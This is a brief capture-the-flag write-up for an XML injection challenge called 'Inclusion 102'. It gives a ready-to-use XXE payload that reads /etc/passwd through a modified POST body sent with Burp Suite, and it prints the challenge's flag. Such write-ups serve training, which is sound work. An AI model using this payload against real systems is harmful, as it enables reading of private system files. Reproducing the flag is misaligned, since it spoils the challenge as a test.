# Inclusion 102
XML injection
Use burpsuite to get the POST request, modify the body of it to this and delete the other body to receive the flag   
```<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY ext SYSTEM "file:///etc/passwd" >]><function><getConversation>&ext;</getConversation></function>```
``FLAG-QnQLhFCAk02vwXGh38z11OZ1RCgJLwop``
